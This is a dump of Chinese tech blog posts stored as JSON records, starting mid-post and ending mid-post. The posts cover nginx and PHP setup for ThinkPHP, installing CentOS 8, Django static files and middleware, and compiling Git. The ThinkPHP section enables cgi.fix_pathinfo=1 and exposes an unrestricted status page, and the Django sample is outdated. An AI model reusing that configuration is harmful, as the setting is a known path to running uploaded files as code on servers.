Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">8、LNMP相关软件目录及文件位置<br style=\"margin:.2em;\"><a href=\"https://lnmp.org/faq/lnmp-software-list.html\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">https://lnmp.org/faq/lnmp-software-list.html</a></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">9、LNMP状态管理命令<br style=\"margin:.2em;\"><a href=\"https://lnmp.org/faq/lnmp-status-manager.html\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">https://lnmp.org/faq/lnmp-status-manager.html</a></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">10、仅安装数据库、Nginx<br style=\"margin:.2em;\">lnmp 1.4开始支持只安装MySQL/MariaDB数据库或Nginx<br style=\"margin:.2em;\">增加单独nginx安装，安装包目录下运行：./install.sh nginx 进行安装；<br style=\"margin:.2em;\">增加单独数据库安装，安装包目录下运行：./install.sh db 进行安装；</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">通过wincp工具将项目上传至nginx访问目录下，默认根目录为：/home/wwwroot/default<br style=\"margin:.2em;\">通过IP地址打开 成功<br style=\"margin:.2em;\"><br></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">修改根目录方法：打开nginx配置文件<br style=\"margin:.2em;\">/usr/local/nginx/conf/nginx.conf<br style=\"margin:.2em;\">看到一条 /home/wwwroot/default ， 改成你要的路径就可以了，比如我改成<br style=\"margin:.2em;\">/home/wwwroot/html<br style=\"margin:.2em;\">然后重启nginx<br style=\"margin:.2em;\">service nginx reload</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">再打开试试！</span></p><h2 class=\"line\" style=\"padding:0px 0px .3em;font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;line-height:1.225;margin-top:0px;margin-bottom:14px;border-bottom:1px solid rgb(238,238,238);color:rgba(0,0,0,.870588);background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\"><a style=\"color:rgb(65,131,196);background-color:transparent;\"></a>thinkphp 在lnmp上配置。LNMP需要进行配置才能支持thinkphp3.2的，最简单的方法如下：</span></h2><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">1、概述<br style=\"margin:.2em;\">thinkphp 不能直接在nginx上使用 因为要用pathinfo。<br style=\"margin:.2em;\">2、配置<br style=\"margin:.2em;\">2.1 修改PHP.INI 支持 PHPINOF<br style=\"margin:.2em;\">PHP配置文件：/usr/local/php/etc/php.ini<br style=\"margin:.2em;\">更改php.ini<br style=\"margin:.2em;\">找到：cgi.fix_pathinfo=0<br style=\"margin:.2em;\">更改为：cgi.fix_pathinfo=1<br style=\"margin:.2em;\">2.2 修改nginx配置文件<br style=\"margin:.2em;\">配置文件路径查询：nginx -t 显示出路径，可以直接用WINCP工具直接从文件打开修改，复制以下全部内容，替换掉原来的 由server{--------..........include vhost/*.conf;<br style=\"margin:.2em;\">} 里面的所有内容，项目路径可以自己考虑</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">server<br style=\"margin:.2em;\">{<br style=\"margin:.2em;\">listen 80 default_server;<br style=\"margin:.2em;\">#listen [::]:80 default_server ipv6only=on;<br style=\"margin:.2em;\">server_name <a href=\"http://www.lnmp.org/\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">www.lnmp.org</a>;<br style=\"margin:.2em;\">index index.html index.htm index.php;<br style=\"margin:.2em;\">root /home/wwwroot/html;</span></p><pre style=\"font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace;margin-bottom:14px;line-height:1.45;padding-top:16px;padding-bottom:16px;background-color:rgb(247,247,247);border:0px;color:rgba(0,0,0,.870588);\"><code style=\"font-family:Consolas, 'Liberation Mono', Menlo, Courier, monospace;background-color:transparent;line-height:inherit;max-width:100%;margin:0px;border:0px;\"><span style=\"font-size:16px;\">    #error_page   404   /404.html;\n    #include enable-php.conf;\n    include enable-php-pathinfo.conf;\n\n    location / {\n      if (!-e $request_filename) {\n      rewrite ^/(.*)$ /index.php/$1;\n      }\n    }   \n\n    location ~ \\.php {\n    #fastcgi_pass remote_php_ip:9000;\n    fastcgi_pass unix:/dev/shm/php-cgi.sock;\n    fastcgi_index index.php;\n    include fastcgi_params;\n\n    set $real_script_name $fastcgi_script_name;\n    if ($fastcgi_script_name ~ \"^(.+?\\.php)(/.+)$\") {\n      set $real_script_name $1;\n      set $path_info $2;\n    }\n      fastcgi_param SCRIPT_FILENAME $document_root$real_script_name;\n      fastcgi_param SCRIPT_NAME $real_script_name;\n      fastcgi_param PATH_INFO $path_info;\n    }\n\n    location /nginx_status\n    {\n        stub_status on;\n        access_log   off;\n    }\n\n    location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$\n    {\n        expires      30d;\n    }\n\n    location ~ .*\\.(js|css)?$\n    {\n        expires      12h;\n    }\n\n    location ~ /\\.\n    {\n        deny all;\n    }\n\n    access_log  /home/wwwlogs/access.log;\n}\n</span></code></pre><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">include vhost/*.conf;<br style=\"margin:.2em;\">}</span></p><p style=\"margin-bottom:0px;line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;background-color:rgb(255,255,255);\"><span style=\"font-size:16px;\">3、重启<br style=\"margin:.2em;\">lnmp restart</span></p>                                    </div>", "log_PostTime": 1584891029, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CentOS 8 安装图解", "log_Intro": "CentOS 8 安装图解", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>继 RHEL 8 发布之后，CentOS 社区也发布了让人期待已久的 CentOS 8，并发布了两种模式：</p>\n\n<ul><li>CentOS stream：滚动发布的 Linux 发行版，适用于需要频繁更新的开发者</li>\n\t<li>CentOS：类似 RHEL 8 的稳定操作系统，系统管理员可以用其部署或配置服务和应用</li>\n</ul><p>在这篇文章中，我们会使用图解的方式演示 CentOS 8 的安装方法。</p>\n\n<h3 id=\"toc_1\">CentOS 8 的新特性</h3>\n\n<ul><li>DNF 成为了默认的软件包管理器，同时 yum 仍然是可用的</li>\n\t<li>使用网络管理器（<code>nmcli</code> 和 <code>nmtui</code>）进行网络配置，移除了网络脚本</li>\n\t<li>使用 Podman 进行容器管理</li>\n\t<li>引入了两个新的包仓库：BaseOS 和 AppStream</li>\n\t<li>使用 Cockpit 作为默认的系统管理工具</li>\n\t<li>默认使用 Wayland 作为显示服务器</li>\n\t<li><code>iptables</code> 将被 <code>nftables</code> 取代</li>\n\t<li>使用 Linux 内核 4.18</li>\n\t<li>提供 PHP 7.2、Python 3.6、Ansible 2.8、VIM 8.0 和 Squid 4</li>\n</ul><h3 id=\"toc_2\">CentOS 8 所需的最低硬件配置:</h3>\n\n<ul><li>2 GB RAM</li>\n\t<li>64 位 x86 架构、2 GHz 或以上的 CPU</li>\n\t<li>20 GB 硬盘空间</li>\n</ul><h3 id=\"toc_3\">CentOS 8 安装图解</h3>\n\n<p>第一步：下载 CentOS 8 ISO 文件</p>\n\n<p>在 CentOS 官方网站 <a href=\"https://www.centos.org/download/\" rel=\"nofollow\">https://www.centos.org/download/</a> 下载 CentOS 8 ISO 文件。</p>\n\n<p>第二步： 创建 CentOS 8 启动介质（USB 或 DVD）</p>\n\n<p>下载 CentOS 8 ISO 文件之后，将 ISO 文件烧录到 USB 移动硬盘或 DVD 光盘中，作为启动介质。</p>\n\n<p>然后重启系统，在 BIOS 中设置为从上面烧录好的启动介质启动。</p>\n\n<p>第三步：选择“安装 CentOS Linux 8.0”选项</p>\n\n<p>当系统从 CentOS 8 ISO 启动介质启动之后，就可以看到以下这个界面。选择“Install CentOS Linux 8.0”（安装 CentOS Linux 8.0）选项并按回车。</p>\n\n<p><img alt=\"Choose-Install-CentOS8\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjAza3d0NHl2anhtbnZ6cmpycC5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Choose-Install-CentOS8</em></p>\n\n<p>第四步：选择偏好语言</p>\n\n<p>选择想要在 CentOS 8 <strong>安装过程</strong>中使用的语言，然后继续。</p>\n\n<p><img alt=\"Select-Language-CentOS8-Installation\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjAzZGhmbmxmeWg4cDBhamJxei5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Select-Language-CentOS8-Installation</em></p>\n\n<p>第五步：准备安装 CentOS 8</p>\n\n<p>这一步我们会配置以下内容：</p>\n\n<ul><li>键盘布局</li>\n\t<li>日期和时间</li>\n\t<li>安装来源</li>\n\t<li>软件选择</li>\n\t<li>安装目标</li>\n\t<li>Kdump</li>\n</ul><p><img alt=\"Installation-Summary-CentOS8\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjA0ZGp5ejlpd2hmN3JlOW5ybi5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Installation-Summary-CentOS8</em></p>\n\n<p>如上图所示，安装向导已经自动提供了“键盘布局Keyboard”、“时间和日期Time &amp; Date”、“安装来源Installation Source”和“软件选择Software Selection”的选项。</p>\n\n<p>如果你需要修改以上设置，点击对应的图标就可以了。例如修改系统的时间和日期，只需要点击“时间和日期Time &amp; Date”，选择正确的时区，然后点击“完成Done”即可。</p>\n\n<p><img alt=\"TimeZone-CentOS8-Installation\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjA0ZWQyYWw1MnA1Mjd6YnpicC5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>TimeZone-CentOS8-Installation</em></p>\n\n<p>在软件选择选项中选择安装的模式。例如“包含图形界面Server with GUI”选项会在安装后的系统中提供图形界面，而如果想安装尽可能少的额外软件，可以选择“最小化安装Minimal Install”。</p>\n\n<p><img alt=\"Software-Selection-CentOS8-Installation\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjA1YWRrN3p2c3h4ZmgxYXYyNS5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Software-Selection-CentOS8-Installation</em></p>\n\n<p>这里我们选择“包含图形界面Server with GUI”，点击“完成Done”。</p>\n\n<p>Kdump 功能默认是开启的。尽管这是一个强烈建议开启的功能，但也可以点击对应的图标将其关闭。</p>\n\n<p>如果想要在安装过程中对网络进行配置，可以点击“网络与主机名Network &amp; Host Name”选项。</p>\n\n<p><img alt=\"Networking-During-CentOS8-Installation\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjA1Y29tNjZldHoxZXFsNnYycS5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Networking-During-CentOS8-Installation</em></p>\n\n<p>如果系统连接到启用了 DHCP 功能的调制解调器上，就会在启动网络接口的时候自动获取一个 IP 地址。如果需要配置静态 IP，点击“配置Configure”并指定 IP 的相关信息。除此以外我们还将主机名设置为 “linuxtechi.com”。</p>\n\n<p>完成网络配置后，点击“完成Done”。</p>\n\n<p>最后我们要配置“安装目标Installation Destination”，指定 CentOS 8 将要安装到哪一个硬盘，以及相关的分区方式。</p>\n\n<p><img alt=\"Installation-Destination-Custom-CentOS8\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjA2Y3M3cDMyNTQ3N242d2R5cC5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Installation-Destination-Custom-CentOS8</em></p>\n\n<p>点击“完成Done”。</p>\n\n<p>如图所示，我为 CentOS 8 分配了 40 GB 的硬盘空间。有两种分区方案可供选择：如果由安装向导进行自动分区，可以从“存储配置Storage Configuration”中选择“自动Automatic”选项；如果想要自己手动进行分区，可以选择“自定义Custom”选项。</p>\n\n<p>在这里我们选择“自定义Custom”选项，并按照以下的方式创建基于 LVM 的分区：</p>\n\n<ul><li><code>/boot</code> – 2 GB (ext4 文件系统)</li>\n\t<li><code>/</code> – 12 GB (xfs 文件系统)</li>\n\t<li><code>/home</code> – 20 GB (xfs 文件系统)</li>\n\t<li><code>/tmp</code> – 5 GB (xfs 文件系统)</li>\n\t<li>Swap – 1 GB (xfs 文件系统)</li>\n</ul><p>首先创建 <code>/boot</code> 标准分区，设置大小为 2GB，如下图所示：</p>\n\n<p><img alt=\"boot-partition-CentOS8-Installation\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjA2cTl0NG90bzk0YW00OXN6dC5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>boot-partition-CentOS8-Installation</em></p>\n\n<p>点击“添加挂载点Add mount point”。</p>\n\n<p>再创建第二个分区 <code>/</code>，并设置大小为 12GB。点击加号，指定挂载点和分区大小，点击“添加挂载点Add mount point”即可。</p>\n\n<p><img alt=\"slash-root-partition-centos8-installation\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjA3b3lpNG9vZ2Q0ZGNwaGN6ZC5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>slash-root-partition-centos8-installation</em></p>\n\n<p>然后在页面上将 <code>/</code> 分区的分区类型从标准更改为 LVM，并点击“更新设置Update Settings”。</p>\n\n<p><img alt=\"Change-Partition-Type-CentOS8\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjA3Znl4bzkzODc4bWk3aTd4eS5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Change-Partition-Type-CentOS8</em></p>\n\n<p>如上图所示，安装向导已经自动创建了一个卷组。如果想要更改卷组的名称，只需要点击“卷组Volume Group”标签页中的“修改Modify”选项。</p>\n\n<p>同样地，创建 <code>/home</code> 分区和 <code>/tmp</code> 分区，分别将大小设置为 20GB 和 5GB，并设置分区类型为 LVM。</p>\n\n<p><img alt=\"home-partition-CentOS8-Installation\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjA4cThremhodXl1ejN1aThsOC5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>home-partition-CentOS8-Installation</em></p>\n\n<p><img alt=\"tmp-partition-centos8-installation\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjA4azIwaWxlbDdxb24yaWRkcS5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>tmp-partition-centos8-installation</em></p>\n\n<p>最后创建交换分区Swap Partition。</p>\n\n<p><img alt=\"Swap-Partition-CentOS8-Installation\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjA5bHJqbmdzZ2lnYW56dHRyMi5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Swap-Partition-CentOS8-Installation</em></p>\n\n<p>点击“添加挂载点Add mount point”。</p>\n\n<p>在完成所有分区设置后，点击“完成Done”。</p>\n\n<p><img alt=\"Choose-Done-after-manual-partition-centos8\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjA5dTkzMG9wZ3AzODZwM3A5bS5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Choose-Done-after-manual-partition-centos8</em></p>\n\n<p>在下一个界面，点击“应用更改Accept changes”，以上做的更改就会写入到硬盘中。</p>\n\n<p><img alt=\"Accept-changes-CentOS8-Installation\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjExdXdrcmkzcHVoM2RodWg4dS5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Accept-changes-CentOS8-Installation</em></p>\n\n<p>第六步：选择“开始安装”</p>\n\n<p>完成上述的所有更改后，回到先前的安装概览界面，点击“开始安装Begin Installation”以开始安装 CentOS 8。</p>\n\n<p><img alt=\"Begin-Installation-CentOS8\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjExbms2aG5sY2N1MmFoYzJ4dy5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Begin-Installation-CentOS8</em></p>\n\n<p>下面这个界面表示安装过程正在进行中。</p>\n\n<p><img alt=\"Installation-progress-centos8\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjExbnQ4amVqdm5qYjl4bmJodC5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Installation-progress-centos8</em></p>\n\n<p>要设置 root 用户的口令，只需要点击 “root 口令Root Password”选项，输入一个口令，然后点击“创建用户User Creation”选项创建一个本地用户。</p>\n\n<p><img alt=\"Root-Password-CentOS8-Installation\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjEyaTZiNjM1MzM1b2Y2aDN1cC5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Root-Password-CentOS8-Installation</em></p>\n\n<p>填写新创建的用户的详细信息。</p>\n\n<p><img alt=\"Local-User-Details-CentOS8\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjEyaWQ5NGQ5azlranU5ajB0ei5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Local-User-Details-CentOS8</em></p>\n\n<p>在安装完成后，安装向导会提示重启系统。</p>\n\n<p><img alt=\"CentOS8-Installation-Progress\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjEzemwyMmp2czYxOXNxNnA2dy5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>CentOS8-Installation-Progress</em></p>\n\n<p>第七步：完成安装并重启系统</p>\n\n<p>安装完成后要重启系统。只需点击“重启Reboot”按钮。</p>\n\n<p><img alt=\"Installation-Completed-CentOS8\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjEzem84NHFmZWZhZ3ByMzhxMi5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Installation-Completed-CentOS8</em></p>\n\n<p>注意：重启完成后，记得要把安装介质断开，并将 BIOS 的启动介质设置为硬盘。</p>\n\n<p>第八步：启动新安装的 CentOS 8 并接受许可协议</p>\n\n<p>在 GRUB 引导菜单中，选择 CentOS 8 进行启动。</p>\n\n<p><img alt=\"Grub-Boot-CentOS8\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjEzcnIxeXMzaDdyN3I1N3gwOC5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Grub-Boot-CentOS8</em></p>\n\n<p>同意 CentOS 8 的许可证，点击“完成Done”。</p>\n\n<p><img alt=\"Accept-License-CentOS8-Installation\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjE0eDRkaWY1ZDVnNjR1dTFzdS5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Accept-License-CentOS8-Installation</em></p>\n\n<p>在下一个界面，点击“完成配置Finish Configuration”。</p>\n\n<p><img alt=\"Finish-Configuration-CentOS8-Installation\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjE0a29xd3VvemJiOWJyb2d3OC5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Finish-Configuration-CentOS8-Installation</em></p>\n\n<p>第九步：配置完成后登录</p>\n\n<p>同意 CentOS 8 的许可证以及完成配置之后，会来到登录界面。</p>\n\n<p><img alt=\"Login-screen-CentOS8\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjE1dGQ3OGZtaGI2NjFmZmwxNy5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Login-screen-CentOS8</em></p>\n\n<p>使用刚才创建的用户以及对应的口令登录，按照提示进行操作，就可以看到以下界面。</p>\n\n<p><img alt=\"CentOS8-Ready-Use-Screen\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjE2Zmk5YW5oemlvNHBubnBucC5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>CentOS8-Ready-Use-Screen</em></p>\n\n<p>点击“开始使用 CentOS LinuxStart Using CentOS Linux”。</p>\n\n<p><img alt=\"Desktop-Screen-CentOS8\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcubGludXgubmV0LmNuL2RhdGEvYXR0YWNobWVudC9hbGJ1bS8yMDE5MTAvMDkvMTIxMjE2YzM0NHoza2h2aDA0a3BoZS5qcGc?x-oss-process=image/format,png\"></p>\n\n<p><em>Desktop-Screen-CentOS8</em></p>\n\n<p>以上就是 CentOS 8 的安装过程，至此我们已经完成了 CentOS 8 的安装。</p>\n                                    </div>", "log_PostTime": 1584891030, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Django高级管理静态文件和中间件5.1", "log_Intro": "Django高级管理静态文件和中间件5.1", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"管理静态文件\">管理静态文件</h1>\n\n<ul><li>项目中的CSS、图片、js都是静态文件</li>\n</ul><p>配置静态文件</p>\n\n<ul><li>在settings 文件中定义静态内容</li>\n</ul><pre class=\"has\">\n<code>STATIC_URL = '/static/'\nSTATICFILES_DIRS = [\n    os.path.join(BASE_DIR, 'static'),\n]\n</code></pre>\n\n<ul><li>在项目根目录下创建static目录，再创建当前应用名称的目录</li>\n</ul><pre class=\"has\">\n<code>mysite/static/myapp/\n</code></pre>\n\n<ul><li>在模板中可以使用硬编码</li>\n</ul><pre class=\"has\">\n<code>/static/my_app/myexample.jpg\n</code></pre>\n\n<ul><li>在模板中可以使用static编码</li>\n</ul><pre class=\"has\">\n<code>{ % load static from staticfiles %}\n&lt;img src=\"{ % static \"my_app/myexample.jpg\" %}\" alt=\"My image\"/&gt;</code></pre>\n\n<p> </p>\n\n<h1 id=\"中间件\">中间件</h1>\n\n<ul><li>是一个轻量级、底层的插件系统，可以介入Django的请求和响应处理过程，修改Django的输入或输出</li>\n\t<li>激活：添加到Django配置文件中的MIDDLEWARE_CLASSES元组中</li>\n\t<li>每个中间件组件是一个独立的Python类，可以定义下面方法中的一个或多个\n\t<ul><li><em>_init</em> _：无需任何参数，服务器响应第一个请求的时候调用一次，用于确定是否启用当前中间件</li>\n\t\t<li>process_request(request)：执行视图之前被调用，在每个请求上调用，返回None或HttpResponse对象</li>\n\t\t<li>process_view(request, view_func, view_args, view_kwargs)：调用视图之前被调用，在每个请求上调用，返回None或HttpResponse对象</li>\n\t\t<li>process_template_response(request, response)：在视图刚好执行完毕之后被调用，在每个请求上调用，返回实现了render方法的响应对象</li>\n\t\t<li>process_response(request, response)：所有响应返回浏览器之前被调用，在每个请求上调用，返回HttpResponse对象</li>\n\t\t<li>process_exception(request,response,exception)：当视图抛出异常时调用，在每个请求上调用，返回一个HttpResponse对象</li>\n\t</ul></li>\n\t<li>使用中间件，可以干扰整个处理过程，每次请求中都会执行中间件的这个方法</li>\n\t<li>示例：自定义异常处理</li>\n\t<li>与settings.py同级目录下创建myexception.py文件，定义类MyException，实现process_exception方法</li>\n</ul><pre class=\"has\">\n<code>from django.http import HttpResponse\nclass MyException():\n    def process_exception(request,response, exception):\n        return HttpResponse(exception.message)\n</code></pre>\n\n<ul><li>将类MyException注册到settings.py中间件中</li>\n</ul><pre class=\"has\">\n<code>MIDDLEWARE_CLASSES = (\n    'test1.myexception.MyException',\n    ...\n)\n</code></pre>\n\n<ul><li>定义视图，并发生一个异常信息，则会运行自定义的异常处理</li>\n</ul>                                    </div>", "log_PostTime": 1584891031, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "centos7 安装Git", "log_Intro": "centos7 安装Git", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>安装git前先检查一下是否有旧版本git</p>\n\n<p>通过git –version查看系统带的版本，如果有就删除</p>\n\n<p># yum remove git</p>\n\n<p>1.安装依赖的包</p>\n\n<p>yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel<br>\nyum install  gcc perl-ExtUtils-MakeMaker<br>\n2.下载git源码并解压</p>\n\n<p>wget https://github.com/git/git/archive/v2.3.0.zip<br>\nunzip v2.3.0.zip（或：unzip v2.3.0）<br>\n进入解压的目录</p>\n\n<p>cd git-2.3.0<br>\n3.编译安装</p>\n\n<p>安装在/usr/local/下</p>\n\n<p>make prefix=/usr/local/git all<br>\nmake prefix=/usr/local/git install</p>\n\n<p>　编译时出现如下异常：</p>\n\n<pre>\n<code class=\"language-html hljs\">libgit.a(utf8.o): In function `reencode_string_iconv':\n/root/git-2.3.0/utf8.c:463: undefined reference to `libiconv'\nlibgit.a(utf8.o): In function `reencode_string_len':\n/root/git-2.3.0/utf8.c:502: undefined reference to `libiconv_open'\n/root/git-2.3.0/utf8.c:521: undefined reference to `libiconv_close'\n/root/git-2.3.0/utf8.c:515: undefined reference to `libiconv_open'\ncollect2: ld 返回 1\nmake: *** [git-credential-store] 错误 1</code></pre>\n\n<p>　　下载并安装libiconv</p>\n\n<pre>\n<code class=\"language-html hljs\">cd ..\nwget http://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.14.tar.gz\ntar -zxvf libiconv-1.14.tar.gz\ncd 